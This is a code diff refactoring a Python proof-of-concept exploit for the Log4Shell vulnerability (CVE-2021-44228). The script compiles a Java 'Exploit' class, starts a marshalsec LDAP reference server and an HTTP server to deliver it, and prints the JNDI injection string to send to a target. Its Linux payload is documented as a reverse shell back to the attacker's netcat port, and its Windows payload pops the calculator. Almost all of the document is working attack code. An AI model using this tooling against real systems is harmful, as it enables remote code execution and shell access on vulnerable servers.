@@ -1,5 +1,7 @@
 import argparse
 import os
+import platform
+import shutil
 import subprocess
 import threading
 from http.server import HTTPServer, SimpleHTTPRequestHandler
@@ -7,37 +9,188 @@ from pathlib import Path
 
 from colorama import Fore, init
 
-CUR_FOLDER = Path(__file__).parent.resolve()
+
+def main() -> None:
+    """
+    Entry point for the Log4Shell POC script.
+
+    Parses command-line arguments, generates a payload, starts an LDAP server,
+    and runs a web server.
+
+    Returns:
+        None
+    """
+
+    init(autoreset=True)
+
+    parser = argparse.ArgumentParser(description="Log4Shell POC")
+
+    parser.add_argument(
+        "--userip",
+        metavar="userip",
+        type=str,
+        default="localhost",
+        help="Enter IP for LDAPRefServer & Reverse Shell",
+    )
+    parser.add_argument(
+        "--webport",
+        metavar="webport",
+        type=int,
+        default=8000,
+        help="Listener port for HTTP port",
+    )
+    parser.add_argument(
+        "--lport",
+        metavar="lport",
+        type=int,
+        default=9001,
+        help="Netcat Port",
+    )
+
+    args = parser.parse_args()
+
+    print(Fore.BLUE + "[!] CVE: CVE-2021-44228\n")
+
+    try:
+        if not is_java_installed():
+            print(Fore.RED + "[-] Java is not installed")
+            raise SystemExit(1)
+
+        setup_and_run_payload_server(args.userip, args.webport, args.lport)
+
+    except KeyboardInterrupt:
+        print(Fore.RED + "[!] user interrupted the program")
+        raise SystemExit(0)
+
+
+def is_java_installed() -> bool:
+    """
+    Checks whether Java is installed on the system.
+
+    Returns:
+        bool: True if Java is installed, False otherwise.
+    """
+
+    return bool(shutil.which("java"))
+
+
+def setup_and_run_payload_server(userip: str, webport: int, lport: int) -> None:
+    """
+    Sets up and runs a payload server that generates a Java payload based on the operating system.\n
+    Starts an LDAP server on a new thread, and a web server on the main thread.
+
+    Args:
+        userip (str): The user's IP address.
+        webport (int): The port for the web server.
+        lport (int): The local port to listen on.
+
+    Returns:
+        None
+    """
+
+    print(Fore.GREEN + "[+] Generating Payload...")
+    generate_payload(userip, lport)
+
+    # start the LDAP server on new thread
+    print(Fore.GREEN + "[+] Starting LDAP server\n")
+    t1 = threading.Thread(target=run_ldap_server, args=(userip, webport))
+    t1.start()
+
+    # start the web server on main thread
+    print(Fore.GREEN + f"[+] Starting web server http://0.0.0.0:{webport}\n")
+    httpd = HTTPServer(("0.0.0.0", webport), SimpleHTTPRequestHandler)
+    httpd.serve_forever()
 
 
 def generate_payload(userip: str, lport: int) -> None:
-    if os.name == "nt":
-        print(Fore.BLUE + "[!] Running on Windows\n")
+    """
+    Generates a Java payload based on the operating system and writes it to a file.
 
-        program = """
-public class Exploit {
-    public Exploit() {}
-    static {
-        try {
-            System.out.println("Exploit");
-            String[] cmds = System.getProperty("os.name").toLowerCase().contains("win")
-                    ? new String[]{"cmd.exe","/c", "calc.exe"}
-                    : new String[]{"open","/System/Applications/Calculator.app"};
-            java.lang.Runtime.getRuntime().exec(cmds).waitFor();
-        }catch (Exception e){
-            e.printStackTrace();
-        }
-    }
-    public static void main(String[] args) {
-        Exploit e = new Exploit();
-    }
-}
+    Args:
+        userip (str): The user's IP address.
+        lport (int): The local port to listen on.
 
-"""
+    Returns:
+        None
+    """
+
+    # determine the payload based on the operating system
+    payload_functions = {
+        "Linux": linux_payload,
+        "Windows": windows_payload,
+        "Darwin": macos_payload,
+    }
+
+    os_name = platform.system()
+
+    if os_name in payload_functions:
+        print(f"[+] Using payload for {os_name}")
+        program = payload_functions[os_name](userip, lport)
     else:
-        print(Fore.BLUE + "[!] Not running on Windows\n")
+        print(Fore.RED + "[-] Unknown operating system. Using default payload.")
+        program = default_payload()
 
-        program = """
+    # write the payload to Exploit.java file
+    filename = Path("Exploit.java")
+
+    try:
+        filename.write_text(program)
+        subprocess.run(
+            [
+                "javac",
+                str(filename),
+            ]
+        )
+    except OSError as e:
+        print(Fore.RED + f"[-] Failed to create payload: {e}")
+        raise e
+    else:
+        print("[+] Successfully created payload\n")
+
+
+def run_ldap_server(userip: str, lport: int) -> None:
+    """
+    Starts an LDAP reference server for exploitation.
+
+    Args:
+        userip (str): The IP address of the LDAP server.
+        lport (int): The listener port for the LDAP server.
+
+    Returns:
+        None
+    """
+
+    CURR_DIR = Path(__file__).parent.resolve()
+
+    sendme = f"${{jndi:ldap://{userip}:1389/a}}"
+
+    print(Fore.GREEN + f"[+] Send me: {sendme}\n")
+
+    url = f"http://{userip}:{lport}/#Exploit"
+    subprocess.run(
+        [
+            "java",
+            "-cp",
+            os.path.join(CURR_DIR, "ldap/marshalsec-0.0.3-SNAPSHOT-all.jar"),
+            "marshalsec.jndi.LDAPRefServer",
+            url,
+        ]
+    )
+
+
+def linux_payload(userip: str, lport: int) -> str:
+    """
+    Generates a Java program that starts a reverse shell on a Linux system.
+
+    Args:
+        userip (str): The IP address of the attacker's machine.
+        lport (int): The listener port for the reverse shell.
+
+    Returns:
+        str: A Java program that establishes a reverse shell connection.
+    """
+
+    program = """
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.OutputStream;
@@ -79,107 +232,51 @@ public class Exploit {
 
 """ % (userip, lport)
 
-    # writing the exploit to Exploit.java file
-
-    p = Path("Exploit.java")
-
-    try:
-        p.write_text(program)
-        subprocess.run(
-            [
-                "javac",
-                str(p),
-            ]
-        )
-    except OSError as e:
-        print(Fore.RED + f"[-] Something went wrong {e}")
-        raise e
-    else:
-        print(Fore.GREEN + "[+] Exploit java class created success")
+    return program
 
 
-def payload(userip: str, webport: int, lport: int) -> None:
-    generate_payload(userip, lport)
+def windows_payload(userip: str, lport: int) -> str:
+    """
+    Generates a Java program that starts the calculator application on a Windows system.
 
-    print(Fore.GREEN + "[+] Setting up LDAP server\n")
+    Args:
+        userip (str): The user's IP address (not directly used in the program).
+        lport (int): The local port to listen on (not directly used in the program).
 
-    # create the LDAP server on new thread
-    t1 = threading.Thread(target=ldap_server, args=(userip, webport))
-    t1.start()
+    Returns:
+        str: A Java program that starts the calculator application.
+    """
 
-    # start the web server
-    print(f"[+] Starting Webserver on port {webport} http://0.0.0.0:{webport}")
-    httpd = HTTPServer(("0.0.0.0", webport), SimpleHTTPRequestHandler)
-    httpd.serve_forever()
+    program = """
+public class Exploit {
+    public Exploit() {}
+    static {
+        try {
+            System.out.println("Exploit");
+            String[] cmds = System.getProperty("os.name").toLowerCase().contains("win")
+                    ? new String[]{"cmd.exe","/c", "calc.exe"}
+                    : new String[]{"open","/System/Applications/Calculator.app"};
+            java.lang.Runtime.getRuntime().exec(cmds).waitFor();
+        }catch (Exception e){
+            e.printStackTrace();
+        }
+    }
+    public static void main(String[] args) {
+        Exploit e = new Exploit();
+    }
+}
 
-
-def ldap_server(userip: str, lport: int) -> None:
-    sendme = "${jndi:ldap://%s:1389/a}" % (userip)
-    print(Fore.GREEN + f"[+] Send me: {sendme}\n")
-
-    url = "http://{}:{}/#Exploit".format(userip, lport)
-    subprocess.run(
-        [
-            "java",
-            "-cp",
-            os.path.join(CUR_FOLDER, "ldap/marshalsec-0.0.3-SNAPSHOT-all.jar"),
-            "marshalsec.jndi.LDAPRefServer",
-            url,
-        ]
-    )
-
-
-def check_java() -> bool:
-    exit_code = subprocess.call(
-        [
-            "java",
-            "-version",
-        ],
-        stderr=subprocess.DEVNULL,
-        stdout=subprocess.DEVNULL,
-    )
-    return exit_code == 0
-
-
-def main() -> None:
-    init(autoreset=True)
-    print(
-        Fore.BLUE
-        + """
-[!] CVE: CVE-2021-44228
-[!] Github repo: https://github.com/kozmer/log4j-shell-poc
 """
-    )
 
-    parser = argparse.ArgumentParser(description="log4shell PoC")
-    parser.add_argument(
-        "--userip",
-        metavar="userip",
-        type=str,
-        default="localhost",
-        help="Enter IP for LDAPRefServer & Shell",
-    )
-    parser.add_argument(
-        "--webport",
-        metavar="webport",
-        type=int,
-        default="8000",
-        help="listener port for HTTP port",
-    )
-    parser.add_argument(
-        "--lport", metavar="lport", type=int, default="9001", help="Netcat Port"
-    )
+    return program
 
-    args = parser.parse_args()
 
-    try:
-        if not check_java():
-            print(Fore.RED + "[-] Java is not installed inside the repository")
-            raise SystemExit(1)
-        payload(args.userip, args.webport, args.lport)
-    except KeyboardInterrupt:
-        print(Fore.RED + "user interrupted the program.")
-        raise SystemExit(0)
+def macos_payload(userip: str, lport: int) -> None:
+    raise NotImplementedError()
+
+
+def default_payload() -> None:
+    raise NotImplementedError()
 
 
 if __name__ == "__main__":
